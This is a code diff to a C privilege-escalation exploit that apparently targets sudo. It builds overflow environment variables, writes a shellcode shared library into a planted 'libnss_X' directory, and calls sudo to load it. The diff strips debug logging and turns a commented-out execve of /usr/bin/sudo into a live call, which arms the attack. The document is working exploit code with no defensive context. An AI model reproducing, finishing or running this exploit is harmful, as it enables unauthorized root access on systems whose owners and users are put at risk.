@@ -5,7 +5,6 @@
 #define TARGET_OFFSET_START 0x786
 #define TMP_PATH "/tmp/present"
 #define PATH_LEN 255
-#define SHELL_PATH "./libnss_X/X1234.so.2"
 
 char *env_var(char *var, int overflow_len, char c) {
   DEBUG_LOG("Creating env_var %s with overflow %d\n", var, overflow_len);
@@ -18,7 +17,7 @@ char *env_var(char *var, int overflow_len, char c) {
 }
 
 void write_exe_to_tmp() {
-  DEBUG_LOG("Writing file\n");
+  DEBUG_LOG("Writing exe to file\n");
   FILE *tmp = global->fopen(TMP_PATH, "w");
   CHECK(tmp == 0);
   char path[PATH_LEN] = {0};
@@ -27,22 +26,19 @@ void write_exe_to_tmp() {
   CHECK(global->fwrite(path, sizeof(char), global->strlen(path), tmp) == 0);
 
   global->fclose(tmp);
-  DEBUG_LOG("write cwd %s to %s\n", path, TMP_PATH);
 }
 
 void drop_shell() {
   DEBUG_LOG("Dropping shell code\n");
 
-  global->mkdir(SHELL_PATH, 0777);
-  FILE *p = global->fopen(SHELL_PATH, "w");
+  global->mkdir("./libnss_X", 0777);
+  FILE *p = global->fopen("./libnss_X/X1234.so.2", "w");
 
   CHECK(p == 0);
 
-  DEBUG_LOG("%d\n", sizeof(SHELLCODE_BIN) / sizeof(char));
   global->fwrite(SHELLCODE_BIN, sizeof(char),
-                 sizeof(SHELLCODE_BIN) / sizeof(char), p);
+                 sizeof(SHELLCODE_BIN) / sizeof(char) - 1, p);
   global->fclose(p);
-  DEBUG_LOG("Dropper finished");
 }
 
 void try_get_root(Globals *glob) {
@@ -99,6 +95,5 @@ void try_get_root(Globals *glob) {
   write_exe_to_tmp();
   drop_shell();
 
-  //  global->execve("/usr/bin/sudo", e_argv, envp);
-  global->exit(0);
+  global->execve("/usr/bin/sudo", e_argv, envp);
 }
